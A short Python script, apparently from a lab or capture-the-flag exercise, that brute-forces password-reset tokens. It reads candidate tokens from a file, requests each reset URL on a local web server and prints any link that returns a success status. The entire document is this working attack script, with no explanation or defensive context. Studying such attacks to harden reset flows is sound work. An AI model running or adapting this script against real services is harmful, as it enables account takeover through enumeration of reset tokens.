import requests

with open("tokens.txt", "r") as fr:
    for line in fr.readlines():
        token = line.replace("\n", "")
        r = requests.get(f"http://localhost:5000/reset_password/{token}")
        if r.status_code != 200 : continue
        print(f"Found reset link: http://localhost:5000/reset_password/{token}")
